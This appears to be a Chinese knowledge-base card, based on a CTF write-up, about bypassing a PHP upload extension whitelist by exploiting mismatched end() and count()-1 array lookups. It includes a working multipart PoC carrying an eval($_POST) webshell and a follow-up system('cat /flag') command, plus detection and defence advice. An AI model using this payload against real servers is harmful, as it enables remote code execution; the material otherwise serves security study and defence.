---
id: web-generic-file-upload-php-array-end-count-order-bypass
title: 上传校验用 end() 取扩展名、用 [count()-1] 拼文件名：PHP 数组插入顺序与数字键错位绕过白名单保存为 .php
type: scenario
domain: web
path: web/generic/file-upload
technique: php-array-insertion-order-end-count-mismatch
aliases:
- end() 与 count()-1 取值不一致绕过上传
- filename 数组插入顺序绕过扩展名白名单
- reset()/end()/count() 错位写 php
- PHP 数组键顺序与插入顺序差异
tags:
- php
- file-upload
- whitelist-bypass
- array-order
- end
- count
- getshell
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-5
  verified_at: '2026-11-08T01:19:23+08:00'
  notes: 已对照原文核对：ez_upload 源码用 end($file) 取扩展名、用 reset($file).$file[count($file)-1] 拼保存名，数组插入顺序与数字键错位，PoC filename[1]=php 与 filename[0]=png 及图24/25 成功写入 php.php 并 cat /flag 一致；dedup 的 merge 为自命中，其余 related 结论不同；CTF 题无受影响版本标记；PoC 未独立执行
---

## 一句话结论

上传校验把文件名 `explode('.')` 成数组（或接受 POST 数组），用 `end($file)` 取扩展名做白名单，却用 `reset($file) . '.' . $file[count($file)-1]` 拼保存文件名；当传入的 `filename` 是数组且故意让"插入顺序"与"数字键顺序"错位时，`end()` 取到能通过白名单的值（如 `png`），而 `[count($file)-1]` 按键名取到 `php`，最终文件被保存为 `.php`，配合图片马 getshell。

## 原理

- PHP 数组同时维护"插入顺序"与"键=>值"映射：`end($file)` 把内部指针移到**插入顺序**的最后一个元素；`reset($file)` 返回插入顺序的第一个元素；而 `$file[count($file)-1]` 是**按键名**索引取值，两者在键名不按 0,1,2… 顺序插入时会指向不同元素。
- 典型构造：POST `filename[1]=php` 先插入、`filename[0]=png` 后插入。数组为 `[1=>'php', 0=>'png']`（插入顺序 1 后 0）：`end()` = 插入顺序最后 = `'png'` → 通过 `in_array($ext,['jpg','png','gif'])` 白名单；`reset()` = 插入顺序第一 = `'php'`；`count($file)-1 = 1` → `$file[1] = 'php'`。
- 于是 `$filename = reset($file) . '.' . $file[count($file)-1] = 'php' . '.' . 'php'`，`move_uploaded_file()` 写入 `php.php`，而扩展名检查看到的是 `png`。
- 内容侧再用 `GIF89a` 图片头 + `<?php eval($_POST['a']);?>`（MIME 设为 `image/png`）通过 MIME 白名单，访问 `php.php` 并 POST 命令即 getshell。
- 根因：用两种不同的"取最后一个元素"语义（指针 end vs 键索引 count-1）分别做"检查"与"执行"，且信任了用户可控的数组结构。

## 触发条件

- 上传点接受 `POST['filename']` 为数组（或把文件名 explode 成数组后仍受控）；
- 扩展名白名单校验用 `end($file)`，保存文件名却用 `reset($file).'.'.$file[count($file)-1]`；
- 上传目录可解析/执行 PHP，且保存路径可预测/回显；
- MIME 白名单可伪造（Content-Type 可控）。

## 利用步骤

1. 审计源码，确认 `end()` 做校验、`[count-1]` 做拼接，且 filename 可为数组。
2. 构造 multipart：`filename[1]=php`、`filename[0]=png`（先 1 后 0），文件内容为图片头 + PHP webshell，文件 MIME 设 `image/png`。
3. 上传，从响应取得 `filepath`（本题回显 `/var/www/html/upload/<md5>/php.php`）。
4. 访问该 `.php` 文件并 POST 命令参数（如 `a=system('cat /flag');`）执行任意命令。

## PoC

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=BOUNDARY

--BOUNDARY
Content-Disposition: form-data; name="filename[1]"

php
--BOUNDARY
Content-Disposition: form-data; name="filename[0]"

png
--BOUNDARY
Content-Disposition: form-data; name="file"; filename="waf.png"
Content-Type: image/png

GIF89a<?php eval($_POST['a']);?>
--BOUNDARY
Content-Disposition: form-data; name="submit"

Submit
--BOUNDARY--
```

```text
POST /upload/<md5>/php.php
a=system('cat /flag');
```

说明：结构复现的通用 payload；键名/字段/路径按目标源码调整；不访问、不执行。

## 变体与关联

- 变体：用更多元素、非连续键、字符串键构造 `end()` 与 `[count-1]` 其它错位；若校验用 `reset()`、拼接用 `end()` 则反向构造。
- 变体：配合 `pathinfo`/`explode('.')` 的其它不一致、双扩展名、`.htaccess`/`.user.ini`、大小写/尾缀空格等上传绕过。
- 关联：[[web-php-deserialization-phar-prefix-filter-halt-compiler-rce]]（同题解的上传 WAF 绕过）；文件上传白名单绕过类卡片。

## 检测与防御

- 检测：代码审计定位 `end($file)`、`reset($file)`、`$file[count($file)-1]` 混用；请求 multipart 中出现 `filename[0]`/`filename[1]` 等数组形式字段。
- 检测：上传目录出现 `.php` 文件、文件内容含 `<?php`/`eval`/图片头混合。
- 防御：统一用 `pathinfo($name, PATHINFO_EXTENSION)` 取扩展名，并让"检查"与"落盘"使用同一个值；不要信任用户传入的数组结构，显式校验 `is_array`/`is_string`。
- 防御：上传目录禁止执行脚本、随机化文件名与扩展名白名单、校验内容真实类型（getimagesize/魔数）。
